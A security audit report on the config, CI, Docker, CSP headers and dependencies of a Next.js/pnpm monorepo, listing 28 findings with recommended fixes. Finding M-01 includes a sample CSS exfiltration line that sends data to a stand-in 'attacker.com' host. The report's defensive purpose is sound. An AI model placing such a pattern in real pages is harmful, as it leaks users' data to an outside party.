# Configuration, Infrastructure & Build System Audit

**Date**: 2025-07-25
**Scope**: `/root/indexnow-dev/` — all config, build, CI/CD, Docker, security headers, dependencies

---

## Summary

| Severity | Count |
|----------|-------|
| **C — Critical** | 2 |
| **H — High** | 8 |
| **M — Medium** | 7 |
| **L — Low** | 5 |
| **E — Enhancement** | 6 |
| **Total** | 28 |

---

## CRITICAL

### C-01: `unsafe-eval` in CSP across ALL apps
| | |
|---|---|
| **Files** | `apps/api/next.config.ts:15`, `apps/admin/next.config.ts:26`, `apps/user-dashboard/next.config.ts:29` |
| **Description** | All three apps include `'unsafe-eval'` in their CSP `script-src` directive. This defeats the core purpose of CSP by allowing `eval()`, `Function()`, and `setTimeout(string)` — the primary vectors for XSS exploitation. |
| **Why it matters** | An attacker who can inject a string into the page can execute arbitrary JavaScript. CSP is meant to prevent this; `unsafe-eval` completely undermines that protection. |
| **Note** | A TODO comment (`#V7 H-18`) acknowledges nonce-based CSP is needed. This should be prioritized. Next.js 16 supports `nonce` via `headers()` in `next.config.ts`. |

### C-02: `unsafe-inline` in script-src on frontend apps
| | |
|---|---|
| **Files** | `apps/admin/next.config.ts:26`, `apps/user-dashboard/next.config.ts:29` |
| **Description** | Both frontend apps include `'unsafe-inline'` in CSP `script-src`. Combined with `unsafe-eval`, this means CSP provides **zero protection** against XSS on these apps. |
| **Why it matters** | `unsafe-inline` allows any inline `<script>` tag to execute. If an attacker can inject HTML, they can inject scripts. This is the #1 XSS vector. |

---

## HIGH

### H-01: CI uses pnpm 9, project requires pnpm 10
| | |
|---|---|
| **File** | `.github/workflows/ci.yml:15` |
| **Description** | `PNPM_VERSION: '9'` but `package.json` specifies `"packageManager": "pnpm@10.28.2"` and engines require `"pnpm": ">=10.0.0"`. |
| **Why it matters** | CI builds may pass or fail differently than local. pnpm 9→10 had breaking changes (catalog protocol, lockfile format). CI may silently use wrong dependency resolution. |

### H-02: 30 npm vulnerabilities (1 critical, 16 high)
| | |
|---|---|
| **Source** | `pnpm audit` |
| **Key vulnerabilities** | |
| — `form-data <2.5.4` (CRITICAL) | Unsafe random function for multipart boundaries. Path: `@analytics/customerio > customerio-node > request > form-data` |
| — `next >=16.1.0-canary.0 <16.1.5` (HIGH) | HTTP deserialization DoS via insecure RSC. Path: all apps via `next` |
| — `nodemailer <=7.0.10` (HIGH) | DoS via recursive addressparser. Path: `packages/mail > nodemailer` |
| — `rollup >=4.0.0 <4.59.0` (HIGH) | Arbitrary file write via path traversal. Path: `vitest > vite > rollup` |
| — `dompurify >=3.1.3 <=3.3.1` (MODERATE) | XSS vulnerability. Path: `apps/api > dompurify` |
| **Why it matters** | The `next` vulnerability is exploitable in production. `dompurify` XSS is ironic given it's a sanitizer. `nodemailer` DoS can be triggered by malformed email addresses. |

### H-03: turbo.json globalEnv missing ~30 server-side env vars
| | |
|---|---|
| **File** | `turbo.json:3-26` |
| **Description** | Only 22 vars listed in `globalEnv`. Missing critical vars used in code: |
| | `REDIS_URL`, `REDIS_USER`, `SUPABASE_JWT_SECRET`, `SUPABASE_BUCKET_NAME`, `PORT`, `LOG_LEVEL`, `SMTP_SECURE`, `SMTP_FROM_NAME`, `SMTP_FROM_EMAIL`, `ENABLE_BULLMQ`, `WORKER_MODE`, `BULL_BOARD_USERNAME`, `BULL_BOARD_PASSWORD`, `SENTRY_ORG`, `SENTRY_PROJECT`, `SENTRY_WEBHOOK_SECRET`, `PADDLE_SUBSCRIPTION_UPDATE_ENABLED`, `PADDLE_PORTAL_ENABLED`, `SE_RANKING_API_KEY`, `SE_RANKING_API_URL`, `PADDLE_API_KEY`, `PADDLE_WEBHOOK_SECRET`, plus 6 `BULLMQ_CONCURRENCY_*` and 6 `BULLMQ_RATE_LIMIT_*` vars. |
| **Why it matters** | Turborepo uses `globalEnv` to bust cache when env vars change. Missing vars means cached builds may serve stale code when only env vars change. This can cause hard-to-debug production issues. `NEXT_PUBLIC_*` vars are covered by the wildcard in the build task, but all server-side vars must be explicit. |

### H-04: apps/api/.env.example missing 5 env vars
| | |
|---|---|
| **File** | `apps/api/.env.example` |
| **Description** | The following vars exist in `.env` but are absent from `.env.example`: `PADDLE_API_KEY`, `PADDLE_WEBHOOK_SECRET`, `SENTRY_SUPPRESS_TURBOPACK_WARNING`, `SE_RANKING_API_KEY`, `SE_RANKING_API_URL` |
| **Why it matters** | New developers won't know these vars are needed. Paddle payment processing and SE Ranking integration will silently fail without them. |

### H-05: Docker Redis exposed on 0.0.0.0:6379 without auth
| | |
|---|---|
| **File** | `docker-compose.yml:8` |
| **Description** | Redis is exposed on `ports: '6379:6379'` with no `--requirepass` flag, no password configuration, and no `command` override. Anyone on the network can connect. |
| **Why it matters** | Redis contains session data, job queues, and rate limiting state. An exposed unauthenticated Redis allows data exfiltration, cache poisoning, and arbitrary command execution (Redis can write files to disk). |

### H-06: Docker services missing health checks
| | |
|---|---|
| **File** | `docker-compose.yml:17-62` |
| **Description** | Redis has a health check, but `api`, `admin`, and `user-dashboard` services have no health checks. `depends_on` without `condition: service_healthy` for non-Redis deps means services start in undefined order. |
| **Why it matters** | Container orchestrators (Docker Swarm, Kubernetes) can't properly manage rolling deployments or auto-restart unhealthy containers. |

### H-07: No security audit step in CI pipeline
| | |
|---|---|
| **File** | `.github/workflows/ci.yml` |
| **Description** | CI runs lint, type-check, test, and build — but no `pnpm audit`, no SAST (CodeQL/SonarQube), no dependency vulnerability scanning. |
| **Why it matters** | Vulnerable dependencies (30 found by `pnpm audit`) are merged without detection. The critical `form-data` and high `next` vulnerabilities would have been caught. |

### H-08: Unsigned admin role-cache cookie
| | |
|---|---|
| **File** | `apps/admin/src/middleware.ts:37-88` |
| **Description** | Admin middleware caches role verification in an unsigned cookie (httpOnly, SameSite=strict). The cookie stores only a user ID, not the role itself. A forged cookie with a valid user ID can skip the DB role check for up to 60 seconds. |
| **Why it matters** | While the attack surface is limited (attacker needs a valid admin user ID), this allows a revoked admin to retain access for the cache TTL window. HMAC-signing the cookie would eliminate this. |

---

## MEDIUM

### M-01: `unsafe-inline` in style-src
| | |
|---|---|
| **Files** | `apps/admin/next.config.ts:26`, `apps/user-dashboard/next.config.ts:29` |
| **Description** | `style-src 'unsafe-inline'` allows injected inline styles. Lower risk than script-src, but enables CSS-based data exfiltration attacks. |
| **Why it matters** | CSS can be used to leak data via `background-image: url(attacker.com?data=...)` selectors. Modern frameworks can use nonces for styles too. |

### M-02: Wildcard domains in CSP
| | |
|---|---|
| **Files** | All three `next.config.ts` files |
| **Description** | CSP allows `https://*.supabase.co`, `https://*.posthog.com`, `https://*.paddle.com`, `https://*.googletagmanager.com`, `https://*.sentry.io`. |
| **Why it matters** | Wildcards on multi-tenant domains (especially `*.supabase.co`) allow loading resources from any tenant's subdomain, not just your own. An attacker who controls another Supabase project could exploit this. Use specific subdomains (e.g., `https://yourproject.supabase.co`). |

### M-03: Dependency version not in catalog — recharts, @paddle/paddle-js
| | |
|---|---|
| **Files** | `apps/user-dashboard/package.json`, `packages/ui/package.json` |
| **Description** | `recharts@3.7.0` and `@paddle/paddle-js@1.4.2` are hardcoded in individual packages instead of using the pnpm catalog. |
| **Why it matters** | Catalog ensures version consistency across the monorepo. Hardcoded versions can drift silently. |

### M-04: postcss.config.mjs in API app (server-only)
| | |
|---|---|
| **File** | `apps/api/postcss.config.mjs` |
| **Description** | The API app is server-only (no pages/UI), yet has a PostCSS + Tailwind CSS config. This is dead configuration. |
| **Why it matters** | Slows down the build by processing CSS that doesn't exist. Confusing for developers. |

### M-05: sentry.client.config.ts in API app (server-only)
| | |
|---|---|
| **File** | `apps/api/sentry.client.config.ts` |
| **Description** | File exists because `@sentry/nextjs` requires it, even for server-only apps. Comment (#V7 L-45) documents this. |
| **Why it matters** | Low actual impact (documented intentionally), but consider if `@sentry/node` alone would suffice for a server-only app, eliminating the need for the client-side Sentry wrapper entirely. |

### M-06: SQL schema has duplicate CREATE TABLE for indb_keyword_rankings
| | |
|---|---|
| **File** | `database-schema/database_schema.sql` |
| **Description** | `CREATE TABLE indb_keyword_rankings` appears twice in the SQL file. This causes an error on fresh database creation unless `IF NOT EXISTS` is used. |
| **Why it matters** | Schema file can't be run idempotently. Second definition may have different columns, causing confusion about the actual schema. |

### M-07: Changeset package names don't match workspace names
| | |
|---|---|
| **File** | `.changeset/config.json:7` |
| **Description** | `linked` array uses `["admin", "api", "user-dashboard"]` but workspace package names are likely `@indexnow/admin`, `@indexnow/api`, etc. (or the directory names in the `name` field of each app's `package.json`). |
| **Why it matters** | Changesets may not properly link version bumps across apps if names don't match. |

---

## LOW

### L-01: .env files exist on disk (not in git)
| | |
|---|---|
| **Files** | `apps/api/.env`, `apps/admin/.env`, `apps/user-dashboard/.env` |
| **Description** | Real `.env` files with production secrets exist on the VPS. They are properly `.gitignore`'d and NOT tracked in git (`git ls-files --cached` confirms). |
| **Why it matters** | No git exposure risk. However, these files on a shared VPS should have restricted permissions (`chmod 600`). Currently standard file perms. |

### L-02: Docker services don't use network isolation
| | |
|---|---|
| **File** | `docker-compose.yml` |
| **Description** | All services share the default bridge network. Redis is accessible from all containers AND the host network (port mapping). |
| **Why it matters** | Best practice is to create internal-only networks for backend services (Redis) and only expose frontend ports. |

### L-03: No Dockerfile multi-stage optimization verification
| | |
|---|---|
| **Files** | `apps/*/Dockerfile` |
| **Description** | Dockerfiles exist and use `node:20-alpine` with pnpm 10.28.2. Not fully audited for multi-stage build efficiency, layer caching, or `.dockerignore` effectiveness. |
| **Why it matters** | Image size and build time optimization. `.dockerignore` properly excludes `.env*` and `node_modules`. |

### L-04: tailwind.config.ts in apps/admin (Tailwind CSS 4 uses CSS-based config)
| | |
|---|---|
| **Files** | `apps/admin/tailwind.config.ts`, `apps/user-dashboard/tailwind.config.ts` |
| **Description** | Tailwind CSS 4 moved to CSS-based configuration (`@config` directive). Having `tailwind.config.ts` may indicate a Tailwind v3 config that's unused or partially migrated. |
| **Why it matters** | Dead config or incomplete migration. The presence of `@tailwindcss/postcss` v4 plugin suggests v4 is in use. |

### L-05: Node.js engine version could be more specific
| | |
|---|---|
| **File** | `package.json` engines field |
| **Description** | `"node": ">=18.0.0"` allows Node 18, 20, 22+. CI uses Node 20. Dockerfiles use `node:20-alpine`. |
| **Why it matters** | Minor — but tightening to `">=20.0.0"` would match actual usage and avoid Node 18 compatibility issues. |

---

## ENHANCEMENT

### E-01: Add `pnpm audit` to CI pipeline
| | |
|---|---|
| **File** | `.github/workflows/ci.yml` |
| **Recommendation** | Add a `security` job that runs `pnpm audit --audit-level=high` and fails the build on high/critical vulnerabilities. |

### E-02: Implement nonce-based CSP
| | |
|---|---|
| **Files** | All `next.config.ts` files |
| **Recommendation** | Replace `unsafe-inline` and `unsafe-eval` with nonce-based CSP. Next.js 16 supports this via `headers()` and `<Script nonce={...}>`. This is already tracked as `#V7 H-18`. |

### E-03: Add GitHub Actions caching for Turborepo
| | |
|---|---|
| **File** | `.github/workflows/ci.yml` |
| **Recommendation** | Add `TURBO_TOKEN` and `TURBO_TEAM` secrets, or use the `turbo-cache` GitHub Action for remote caching. Currently only `node_modules` is cached; Turborepo build outputs are not. |

### E-04: Add Docker health checks for all services
| | |
|---|---|
| **File** | `docker-compose.yml` |
| **Recommendation** | Add health checks to api, admin, user-dashboard services: `test: ['CMD', 'wget', '--spider', '-q', 'http://localhost:PORT/api/health']` |

### E-05: Pin external GitHub Actions to commit SHAs
| | |
|---|---|
| **File** | `.github/workflows/ci.yml` |
| **Recommendation** | `actions/checkout@v4`, `pnpm/action-setup@v4`, etc. should be pinned to full commit SHAs (e.g., `actions/checkout@a5ac7e51b41094c92402da3b24376905380afc29`) to prevent supply-chain attacks via tag mutation. |

### E-06: Add Dependabot or Renovate for automated dependency updates
| | |
|---|---|
| **Recommendation** | No `.github/dependabot.yml` or `renovate.json` exists. Automated PRs for dependency updates would help address the 30 known vulnerabilities and prevent future drift. |

---

## Verified ✅ (No Issues Found)

| Area | Status |
|------|--------|
| `.gitignore` | ✅ Properly ignores `.env`, `.env.*`, `node_modules/`, build outputs, IDE files |
| `.env.example` files | ✅ All 3 apps have them. Admin and user-dashboard are complete. API missing 5 vars (see H-04). |
| DB schema ↔ TypeScript types | ✅ All 28 unique tables match between SQL and `database.ts`. Perfect sync. |
| `packages/database/src/types.ts` | ✅ Does not exist separately — clean re-export from `@indexnow/shared` via `index.ts`. |
| Workspace protocol | ✅ All internal deps use `workspace:*`. |
| tsconfig files | ✅ Consistent path aliases, proper strict mode, correct module resolution. |
| pnpm-workspace.yaml | ✅ Correct patterns, catalog well-adopted. |
| vitest.workspace.ts | ✅ Correct — includes 7 packages, apps excluded with documented reason. |
| User-dashboard middleware | ✅ Clean denylist approach, proper auth redirect handling. |
| API middleware | ✅ Rate limiting (100/60s), CORS, security headers, request logging. |
